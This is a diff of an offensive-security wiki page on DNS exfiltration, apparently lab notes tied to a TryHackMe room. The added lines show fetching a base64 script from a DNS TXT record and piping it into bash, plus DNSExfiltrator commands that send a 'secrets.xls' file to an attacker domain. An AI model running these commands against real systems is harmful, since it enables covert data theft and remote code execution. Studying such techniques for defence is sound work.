@@ -56,8 +56,44 @@ victim@pwnd.lab$ cat toExfiltrate.txt | awk '{print "dig +short " $1}' | bash
 
 Finally, on the attacking machine, we can decrypt datas as follow:
 ```bash
-v4resk@kali$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
+v4resk@kali$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.t1.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
 ```
-
 {% endtab %}
+
+{% tab title="Command Execution" %}
+Let's see how can tunneling code execution via the DNS protocol.
+We first need to create a TXT record containing our script encoded in base64. Let's take`script.tunnel.com` as example.
+
+```bash
+#Check if the TXT record is well configured
+victim@pwnd.lab$ dig +short -t TXT script.tunnel.com
+"IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo="
+
+#Execution over DNS
+victim@pwnd.lab$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
+```
+{% endtab %}
+
+{% tab title="DNSExfiltrator" %}
+[DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.  
+On the attacking machine we do:
+```bash
+v4resk@kali$ ./dnsexfiltrator.py -d mydomain.com -p password
+```
+On the compromised host:
+```bash
+dnsExfiltrator.exe secrets.xls mydomain.com password s=ATTACKING_IP t=500
+```
+{% endtab %}
+
+### DNS Tunneling
+An other methode is to tunneling other protocols over DNS. Check this page for more details.
+{% content-ref url="../pivoting/dnsTunneling.md" %}
+[dnsTunneling.md](../pivoting/dnsTunneling.md)
+{% endcontent-ref %}
+
 {% endtabs %}
+
+
+## Resources
+{% embed url="https://tryhackme.com/room/dataxexfilt" %}
